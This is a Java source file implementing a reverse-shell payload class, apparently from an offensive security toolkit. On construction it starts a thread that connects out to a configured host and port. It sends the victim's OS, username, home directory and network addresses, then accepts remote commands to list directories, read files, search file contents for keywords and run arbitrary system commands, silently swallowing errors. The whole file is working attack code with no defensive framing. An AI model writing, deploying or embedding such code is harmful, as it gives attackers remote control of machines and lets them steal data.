package shell;

import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author wh1t3P1g
 * @since 2020/9/5
 */
public class Shell implements Runnable {

    private static String host;
    private static int port;

    public Shell(){
        new Thread(this).start();
    }

    public String list(String path){
        if(path != null && !path.isEmpty()){
            try {
                StringBuilder stringBuilder = new StringBuilder();
                File file = new File(path.trim());
                if(file.isDirectory()){
                    File[] files = file.listFiles();
                    if(files == null) return null;
                    for(File tmp:files){
                        if(tmp.isDirectory()){
                            stringBuilder.append("d:").append(tmp.getAbsolutePath()).append("\n");
                        }else if(tmp.isFile()){
                            stringBuilder.append("f:").append(tmp.getAbsolutePath()).append("\n");
                        }else{
                            stringBuilder.append("o:").append(tmp.getAbsolutePath()).append("\n"); // other
                        }
                    }
                    return stringBuilder.toString();
                }else if(file.isFile()){
                    return read(path);
                }
            } catch (Exception e) {
                // do nothing
            }
        }
        return null;
    }

    public String read(String file) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader read = new BufferedReader(
                new InputStreamReader(Files.newInputStream(Paths.get(file.trim()))));
        String line2 = null;
        while ((line2 = read.readLine()) != null) {
            stringBuilder.append(line2).append("\n");
        }
        return stringBuilder.toString();
    }

    public String info() throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        String os = System.getProperty("os.name");
        stringBuilder.append("os: ").append(os).append("\n");
        String username = System.getProperty("user.name");
        stringBuilder.append("whoami: ").append(username).append("\n");
        String home = System.getProperty("user.home");
        stringBuilder.append("home: ").append(home).append("\n");
        String dir = System.getProperty("user.dir");
        stringBuilder.append("dir: ").append(dir).append("\n");
        stringBuilder.append("newtork: ").append("\n");
        java.util.Enumeration<java.net.NetworkInterface> nifs = java.net.NetworkInterface.getNetworkInterfaces();
        while (nifs.hasMoreElements()) {
            java.net.NetworkInterface nif = nifs.nextElement();
            java.util.Enumeration<java.net.InetAddress> addresses = nif.getInetAddresses();
            while (addresses.hasMoreElements()) {
                java.net.InetAddress addr = addresses.nextElement();
                stringBuilder.append("address: ").append(addr.getHostAddress()).append(", interface: ").append(nif.getName()).append("\n");
            }
        }
        return stringBuilder.toString();
    }

    public String find(String filename, String filenameKey, String keyword) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        if(filenameKey.length()<3 || keyword.length() < 3){
            stringBuilder.append("suffix or keyword is too shortly!");
        }else{
            stringBuilder = getSearchResult(stringBuilder, filename, filenameKey, keyword);
        }
        return stringBuilder.toString();
    }

    public String exec(String command){
        StringBuilder result = new StringBuilder();

        Process process = null;
        BufferedReader bufferIn = null;
        BufferedReader bufferError = null;

        try {
            process = Runtime.getRuntime().exec(command);

            process.waitFor();

            bufferIn = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            bufferError = new BufferedReader(new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8));

            String line;
            while ((line = bufferIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufferError.readLine()) != null) {
                result.append(line).append('\n');
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            closeStream(bufferIn);
            closeStream(bufferError);

            if (process != null) {
                process.destroy();
            }
        }

        return result.toString();
    }

    private static void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // nothing
            }
        }
    }

    public void run(){
        try {
            String sepS = "===============Start==================\n";
            String sepE = "===============Ended==================\n";
            Socket socket = new Socket(host, port);
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            bufferedWriter.write("happy everyday!\n");
            bufferedWriter.write("\n");
            bufferedWriter.write(info());
            bufferedWriter.write("\n");
            bufferedWriter.write("help: info | list [dir] | read [file] | exec [cmd]\n");
            bufferedWriter.flush();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
            while (true) {
                String line;
                while ((line = bufferedReader.readLine()) == null)
                    ;
                if(line.equals("exit")){
                    return;
                }
                try{
                    StringBuilder result = new StringBuilder();
                    result.append(sepS);
                    if(line.startsWith("list")){
                        String path = line.substring(5);
                        result.append(list(path));
                    }else if(line.startsWith("read")){
                        String file = line.substring(5);
                        result.append(read(file));
                    }else if(line.startsWith("exec")){
                        String command = line.substring(5);
                        result.append(exec(command));
                    }else if(line.startsWith("info")){
                        result.append(info());
                    }else if(line.startsWith("find")){
                        String[] strArr = line.substring(5).split(";");
                        result.append(find(strArr[0], strArr[1], strArr[2]));
                    }
                    result.append(sepE);
                    bufferedWriter.write(result.toString());
                    bufferedWriter.flush();
                }catch (Exception e){
                    //
                    bufferedWriter.write("error, try again!");
                    bufferedWriter.flush();
                }
            }

        } catch (IOException e) {
            // do nothing
        }
    }

    public StringBuilder getSearchResult(StringBuilder stringBuilder, String strPath, String suffix, String keyword) {
        File dir = new File(strPath);
        File[] files = dir.listFiles(); // 该文件目录下文件全部放入数组
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                String fileName = files[i].getName();
                if (files[i].isDirectory()) {
                    stringBuilder = getSearchResult(stringBuilder, files[i].getAbsolutePath(), suffix, keyword);
                } else if (fileName.endsWith(suffix)) {
                    // 匹配文件内容
                    File file = files[i];
                    if (file.exists()) {
                        String s = file.getAbsolutePath();
                        try {
                            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(s)), "UTF-8"));
                            String lineTxt = null;
                            while ((lineTxt = br.readLine()) != null) {
                                // 忽略大小写
                                if (lineTxt.toLowerCase().contains(keyword.toLowerCase())) {
                                    stringBuilder.append("find: " + s + ": " + lineTxt).append("\n");;
                                    break;
                                }
                            }
                            br.close();
                        } catch (Exception e) {
                        }
                    }
                } else {
                    continue;
                }
            }
        }
        return stringBuilder;
    }

    public static Shell newInstance(){
        return new Shell();
    }

}
